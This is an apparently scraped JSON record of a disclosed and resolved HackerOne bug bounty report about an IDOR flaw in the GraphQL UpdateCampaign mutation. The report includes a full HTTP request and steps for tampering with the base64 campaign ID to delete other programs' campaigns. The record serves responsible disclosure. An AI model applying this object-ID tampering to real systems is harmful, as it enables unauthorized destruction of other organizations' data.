@@ -1,0 +1,136 @@
+{
+  "id": 1969141,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xOTY5MTQx",
+  "url": "https://hackerone.com/reports/1969141",
+  "title": "Insecure Direct Object Reference (IDOR) - Delete Campaigns  ",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2023-05-02T03:56:11.624Z",
+  "submitted_at": "2023-05-02T03:56:11.772Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "datph4m",
+    "url": "/datph4m",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/sf34g2r5dqhp4oz6l1dlhdenhp4f/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2023-05-03T11:47:26.684Z",
+  "bug_reporter_agreed_on_going_public_at": "2023-05-03T10:14:31.996Z",
+  "team_member_agreed_on_going_public_at": "2023-05-03T11:47:26.457Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nHi Team, \n\nI think I can delete any Campaigns based on campaign_id\n\n\n### Steps To Reproduce\n\nFollow the POST request below\n\n````\nPOST /graphql HTTP/2\nHost: hackerone.com\nCookie: yourcookie\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/112.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://hackerone.com/organizations/opensea_demo/campaigns/242/edit\nContent-Type: application/json\nX-Csrf-Token: ███\nX-Product-Area: campaigns\nX-Product-Feature: edit\nX-Datadog-Origin: rum\nX-Datadog-Parent-Id: 9027318766950450042\nX-Datadog-Sampling-Priority: 1\nX-Datadog-Trace-Id: 87799383677632658\nContent-Length: 851\nOrigin: https://hackerone.com\nDnt: 1\nSec-Fetch-Dest: empty\nSec-Fetch-Mode: cors\nSec-Fetch-Site: same-origin\nTe: trailers\n\n{\"operationName\":\"UpdateCampaign\",\"variables\":{\"product_area\":\"campaigns\",\"product_feature\":\"edit\",\"input\":{\"campaign_id\":\"Z2lkOi8vaGFja2Vyb25lL0NhbXBhaWduLzI0NA==\",\"team_id\":\"Z2lkOi8vaGFja2Vyb25lL0VuZ2FnZW1lbnRzOjpCdWdCb3VudHlQcm9ncmFtLzU3MzI4\",\"bounty_table_row_id\":\"Z2lkOi8vaGFja2Vyb25lL0JvdW50eVRhYmxlUm93LzEwODM2\",\"start_date\":\"2023-05-05T09:00:00Z\",\"end_date\":\"2023-05-08T05:00:00Z\",\"critical\":3,\"high\":2,\"medium\":1.5,\"low\":1.5,\"structured_scope_ids\":[],\"researchers_information\":\"ccccccccccccccc\"}},\"query\":\"mutation UpdateCampaign($input: UpdateCampaignInput!) {\\n  updateCampaign(input: $input) {\\n    was_successful\\n    errors {\\n      edges {\\n        node {\\n          id\\n          type\\n          field\\n          message\\n          __typename\\n        }\\n        __typename\\n      }\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n\n````\n\nDecode base64 of campaign_id to get **gid://hackerone/Campaign/244**\n\nIncrease or decrease the number after Campaign and re-encode it with base64\n\nAt the campaign_id parameter in the request change it to another program's ongoing campaign_id parameter.\n\nThen send Campaign request of any program to be deleted.\n\n## Impact\n\nCan delete all Campaign on hackerone or any program",
+  "weakness": {
+    "id": 55,
+    "name": "Insecure Direct Object Reference (IDOR)"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2023-06-02T10:14:32.340Z",
+  "allow_singular_disclosure_after": -92638382.43130265,
+  "singular_disclosure_allowed": true,
+  "vote_count": 343,
+  "voters": [
+    "remy1",
+    "achabi7",
+    "shishtawy_sec",
+    "orange303",
+    "t3l3sc0p3",
+    "he4am",
+    "defenderwww",
+    "0xsasan",
+    "m4khn0",
+    "muslimfrompk",
+    "and 333 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "score": 8.3,
+    "author_type": "Team",
+    "metrics": {
+      "attack_vector": "network",
+      "attack_complexity": "low",
+      "privileges_required": "low",
+      "user_interaction": "none",
+      "scope": "unchanged",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
